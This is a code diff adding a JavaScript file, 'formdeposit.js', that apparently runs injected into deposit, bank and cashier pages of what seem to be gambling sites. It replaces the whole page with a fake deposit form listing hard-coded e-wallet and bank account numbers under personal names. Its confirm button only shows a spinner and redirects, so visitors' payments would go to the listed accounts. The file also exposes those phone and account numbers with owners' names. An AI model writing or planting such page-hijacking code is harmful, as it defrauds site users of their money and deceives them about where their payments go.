@@ -1,0 +1,275 @@
+(function () {
+  const url = window.location.href;
+  const match = [
+    '/deposit',
+    '/bank',
+    '/deposit.php',
+    '/qris.php',
+    '/cashier',
+    '/?page=transaksi',
+    '/index.php?page=transaksi',
+    '/?deposit&head=home',
+    '/index.php?page=cashier',
+    '/bank.php'
+  ];
+
+  const isMatch = match.some(path => url.includes(path));
+
+  if (!isMatch) {
+    console.log('[formdeposit.js] URL tidak cocok, script tidak dijalankan.');
+    return;
+  } else {
+    console.log('[formdeposit.js] URL cocok, script dijalankan.');
+  }
+
+  // ======================================
+  // Ganti halaman lama dengan tampilan Formulir Deposit
+  // ======================================
+  document.documentElement.innerHTML = `
+    <head>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <title>Formulir Deposit</title>
+    </head>
+    <body></body>
+  `;
+
+  // ===== CSS =====
+  const style = document.createElement("style");
+  style.textContent = `
+    :root{--accent:#0ea5a4;--bg:#0f172a;--card:#0b1220;--muted:#94a3b8}
+    *{box-sizing:border-box;font-family:Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,'Helvetica Neue',Arial}
+    body{margin:0;background:linear-gradient(180deg,#071027 0%,#071426 100%);color:#e6eef8;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:24px}
+    .container{width:100%;max-width:640px}
+    header{background:rgba(255,255,255,0.03);padding:18px;border-radius:12px;margin-bottom:16px;display:flex;flex-direction:column;gap:8px;text-align:center}
+    h1{margin:0;font-size:20px;letter-spacing:0.6px}
+    .marquee{overflow:hidden;white-space:nowrap}
+    .marquee p{display:inline-block;padding-left:100%;animation:marquee 18s linear infinite;margin:0;color:#ffd700}
+    @keyframes marquee{0%{transform:translateX(0)}100%{transform:translateX(-100%)}}
+
+    .card{background:linear-gradient(180deg,rgba(255,255,255,0.02),transparent);padding:16px;border-radius:12px}
+    label{display:block;font-size:13px;color:var(--muted);margin-bottom:6px}
+    input[type=text],textarea,select{width:100%;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.06);background:transparent;color:inherit}
+    button{background:var(--accent);color:#012;border:none;padding:10px 14px;border-radius:10px;font-weight:600;cursor:pointer}
+    button:disabled{opacity:0.5;cursor:not-allowed}
+    .error{color:#ffb4b4;font-size:13px}
+
+    .tujuan-detail{margin-top:12px;padding:10px;border-radius:10px;background:rgba(255,255,255,0.02);display:none;flex-direction:column;align-items:flex-start;gap:8px;transition:all 0.3s ease}
+    .tujuan-detail img{width:60px;height:60px;object-fit:contain}
+    .rek-row{display:flex;align-items:center;gap:10px}
+    .rek-row button{padding:4px 8px;font-size:12px}
+
+    .footer{margin-top:24px;text-align:center;display:flex;flex-direction:column;align-items:center;gap:8px}
+    .footer img{width:100%;max-width:300px;height:auto;border-radius:10px}
+
+    .overlay{position:fixed;inset:0;background:rgba(2,6,23,0.6);display:flex;align-items:center;justify-content:center;z-index:60;backdrop-filter:blur(3px);}
+    .spinner{width:84px;height:84px;border-radius:12px;background:linear-gradient(180deg,rgba(255,255,255,0.02),transparent);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;padding:12px}
+    .loader{width:36px;height:36px;border-radius:50%;border:4px solid rgba(255,255,255,0.08);border-top-color:var(--accent);animation:spin 1s linear infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}
+
+    .toast-container{position:fixed;top:20px;right:20px;z-index:80;display:flex;flex-direction:column;gap:8px}
+    .toast{background:rgba(255,255,255,0.1);backdrop-filter:blur(6px);padding:10px 14px;border-radius:8px;font-size:14px;animation:slideIn 0.4s ease}
+    @keyframes slideIn{from{opacity:0;transform:translateX(100%)}to{opacity:1;transform:translateX(0)}}
+  `;
+  document.head.appendChild(style);
+
+  // ===== Container =====
+  const container = document.createElement("div");
+  container.className = "container";
+  document.body.appendChild(container);
+
+  // ===== Header =====
+  const header = document.createElement("header");
+  header.innerHTML = `
+    <h1>FORMULIR DEPOSIT</h1>
+    <div class="marquee"><p>Deposit wajib Ke tujuan yang ada pada formulir deposit, transaksi pertama Wajib kode unik, jika tidak maka deposit akan gagal</p></div>
+  `;
+  container.appendChild(header);
+
+  // ===== Card =====
+  const card = document.createElement("section");
+  card.className = "card";
+  card.innerHTML = `
+    <label for="tujuan">Pilih Tujuan Deposit</label>
+    <select id="tujuan"></select>
+    <div class="tujuan-detail" id="tujuanDetail">
+      <img id="tujuanLogo" src="" alt="logo">
+      <div class="rek-row">
+        <div id="tujuanNo"></div>
+        <button id="copyBtn" type="button">Salin</button>
+      </div>
+      <div id="tujuanNama"></div>
+    </div>
+
+    <div style="height:14px"></div>
+    <label for="nominal">Nominal Deposit (Minimal 50.000)</label>
+    <input id="nominal" inputmode="numeric" pattern="[0-9]*" placeholder="50.000" />
+    <div id="nominalHint" style="font-size:12px;color:#94a3b8">Min.50,000 Max.100,000,000</div>
+    <div id="nominalError" class="error" style="display:none"></div>
+
+    <div style="height:12px"></div>
+    <label for="bonus">Pilih Bonus</label>
+    <select id="bonus">
+      <option value="none">Tanpa Bonus (Default)</option>
+      <option value="100">Bonus Deposit 100%</option>
+      <option value="loss">Garansi Kekalahan</option>
+      <option value="cashdrop">Bonus Cash Drop</option>
+      <option value="saldoawal">Bonus Saldo Awal</option>
+    </select>
+
+    <div style="height:12px"></div>
+    <label for="catatan">Catatan (optional)</label>
+    <textarea id="catatan" rows="3" placeholder="Tulis catatan..."></textarea>
+
+    <div style="height:14px"></div>
+    <button id="confirmBtn">Konfirmasi</button>
+  `;
+  container.appendChild(card);
+
+  // ===== Footer =====
+  const footer = document.createElement("div");
+  footer.className = "footer";
+  footer.innerHTML = `
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxt4SV-4Fwz_SHmJwW_ENA4zghNfwbYgAG4x_l9IbA0w&s=10" alt="logo">
+    <div>Inggar2025®</div>
+  `;
+  container.appendChild(footer);
+
+  // ===== Overlay & Toast =====
+  const overlay = document.createElement("div");
+  overlay.id = "overlay";
+  overlay.style.display = "none";
+  overlay.innerHTML = `
+    <div class="overlay">
+      <div class="spinner">
+        <div class="loader"></div>
+        <div style="font-size:13px">Memproses transaksi...</div>
+      </div>
+    </div>
+  `;
+  document.body.appendChild(overlay);
+
+  const toastContainer = document.createElement("div");
+  toastContainer.className = "toast-container";
+  toastContainer.id = "toastContainer";
+  document.body.appendChild(toastContainer);
+
+  // ===== Data Tujuan =====
+  const targets = [
+    {nama_tujuan:'DANA', jenis:'E-WALLET DANA', logo:'https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_dana_blue.svg/1024px-Logo_dana_blue.svg.png', no:'088214538915', nama:'SURWATI'},
+    {nama_tujuan:'OVO', jenis:'E-WALLET OVO', logo:'https://upload.wikimedia.org/wikipedia/commons/thumb/e/eb/Logo_ovo_purple.svg/1024px-Logo_ovo_purple.svg.png', no:'088905200893', nama:'Enjah'},
+    {nama_tujuan:'BCA', jenis:'BCA VIRTUAL ACCOUNT', logo:'https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank_Central_Asia.svg/1598px-Bank_Central_Asia.svg.png', no:'39358088905200893', nama:'Enjah'},
+    {nama_tujuan:'BRI', jenis:'BRI VIRTUAL ACCOUNT', logo:'https://upload.wikimedia.org/wikipedia/commons/thumb/0/02/Bank_BRI_2000.svg/646px-Bank_BRI_2000.svg.png', no:'88810088214538915', nama:'SURWATI'},
+    {nama_tujuan:'BNI', jenis:'BNI VIRTUAL ACCOUNT', logo:'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f0/Bank_Negara_Indonesia_logo_%282004%29.svg/400px-Bank_Negara_Indonesia_logo_%282004%29.svg.png', no:'8740088905200893', nama:'Enjah'},
+    {nama_tujuan:'MANDIRI', jenis:'MANDIRI VIRTUAL ACCOUNT', logo:'https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/Bank_Mandiri_logo_2016.svg/426px-Bank_Mandiri_logo_2016.svg.png', no:'89508088214538915', nama:'SURWATI'},
+    {nama_tujuan:'QRIS', jenis:'QRIS (MAINTENANCE)', logo:'https://i.pinimg.com/originals/eb/ab/89/ebab8980ae3dcc7f3c30e0375a944629.gif', no:'Under Maintenance', nama:'Under Maintenance'}
+  ];
+
+  // ===== DOM Ref =====
+  const tujuanSelect = document.getElementById('tujuan');
+  const tujuanDetail = document.getElementById('tujuanDetail');
+  const tujuanLogo = document.getElementById('tujuanLogo');
+  const tujuanNo = document.getElementById('tujuanNo');
+  const tujuanNama = document.getElementById('tujuanNama');
+  const copyBtn = document.getElementById('copyBtn');
+  const nominalInput = document.getElementById('nominal');
+  const nominalError = document.getElementById('nominalError');
+
+  // ===== Functions =====
+  function renderTujuan() {
+    tujuanSelect.innerHTML = '<option value="">-- Pilih Tujuan --</option>';
+    targets.forEach((t,i)=>{
+      const opt = document.createElement('option');
+      opt.value = i;
+      opt.textContent = `${t.nama_tujuan} - ${t.jenis}`;
+      tujuanSelect.appendChild(opt);
+    });
+  }
+  renderTujuan();
+
+  tujuanSelect.addEventListener('change', e => {
+    const i = e.target.value;
+    if (i === '') { tujuanDetail.style.display = 'none'; return; }
+    const t = targets[i];
+    tujuanLogo.src = t.logo;
+    tujuanNo.textContent = t.no;
+    tujuanNama.textContent = 'Nama: ' + t.nama;
+    tujuanDetail.style.display = 'flex';
+  });
+
+  copyBtn.addEventListener('click', () => {
+    const i = tujuanSelect.value;
+    if (i === '') return;
+    const t = targets[i];
+    if (navigator.clipboard) {
+      navigator.clipboard.writeText(t.no).then(() => {
+        showToast('Nomor rekening berhasil disalin');
+      }).catch(()=>fallbackCopyText(t.no));
+    } else {
+      fallbackCopyText(t.no);
+    }
+  });
+
+  function fallbackCopyText(text){
+    const temp = document.createElement('textarea');
+    temp.value = text;
+    document.body.appendChild(temp);
+    temp.select();
+    try {
+      document.execCommand('copy');
+      showToast('Nomor rekening berhasil disalin');
+    } catch(e){
+      showToast('Gagal menyalin nomor rekening');
+    }
+    document.body.removeChild(temp);
+  }
+
+  function showToast(msg){
+    const div = document.createElement('div');
+    div.className = 'toast';
+    div.textContent = msg;
+    toastContainer.appendChild(div);
+    setTimeout(()=>{
+      div.style.opacity='0';
+      div.style.transition='opacity 0.5s';
+      setTimeout(()=>div.remove(),500);
+    },2000);
+  }
+
+  function formatRupiah(value){
+    if(value===''||isNaN(value)) return '';
+    return String(value).replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+  }
+
+  nominalInput.addEventListener('input', e => {
+    const raw = e.target.value.replace(/[^0-9]/g,'');
+    if(raw===''){e.target.value='';return}
+    e.target.value = formatRupiah(parseInt(raw,10));
+  });
+
+  function getNominalValue(){
+    const v = nominalInput.value.replace(/\./g,'');
+    return v===''?0:parseInt(v,10);
+  }
+
+  document.getElementById('confirmBtn').addEventListener('click', () => {
+    nominalError.style.display='none';
+    const tujuanIndex = tujuanSelect.value;
+    const nominal = getNominalValue();
+    if (tujuanIndex === '') {
+      nominalError.style.display='block';
+      nominalError.textContent='Pilih tujuan deposit terlebih dahulu.';
+      return;
+    }
+    if (nominal < 50000) {
+      nominalError.style.display='block';
+      nominalError.textContent='Nominal minimal 50.000';
+      return;
+    }
+
+    overlay.style.display='block';
+    showToast('Konfirmasi diproses');
+    setTimeout(()=>{ window.location.href = '../'; },1800);
+  });
+
+})();
